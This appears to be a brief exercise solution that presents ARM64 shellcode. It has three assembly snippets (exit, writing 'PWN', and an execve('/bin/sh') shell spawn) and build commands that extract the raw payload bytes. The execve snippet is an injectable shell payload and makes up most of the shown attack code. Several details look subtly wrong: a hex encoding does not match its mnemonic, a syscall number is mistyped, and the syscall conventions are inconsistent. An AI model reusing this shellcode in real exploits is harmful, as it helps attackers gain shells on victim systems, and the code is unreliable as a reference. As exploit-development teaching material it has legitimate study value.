# SOLUTION : SHELLCODE ARM64


```bash
# 1. exit(0)
```
00 00 80 D2    mov x0, #0
21 00 80 D2    mov x16, #1
01 10 00 D4    svc #0x80


```bash
# 2. write("PWN\n")
```
.global _start
_start:
    adr x1, msg
    mov x0, #1
    mov x2, #4
    mov x16, #0x2000004
    svc #0x80
    
    mov x0, #0
    mov x16, #0x2000001
    svc #0x80

msg: .ascii "PWN\n"


```bash
# 3. execve("/bin/sh")
```
_start:
    adr x0, binsh
    eor x1, x1, x1
    eor x2, x2, x2
    mov x16, #0x200003B
    svc #0x80

binsh: .ascii "/bin/sh\0"


```bash
# Compilation
```
as -o shell.o shell.s
ld -o shell shell.o -lSystem -arch arm64
objcopy -O binary shell shellcode.bin


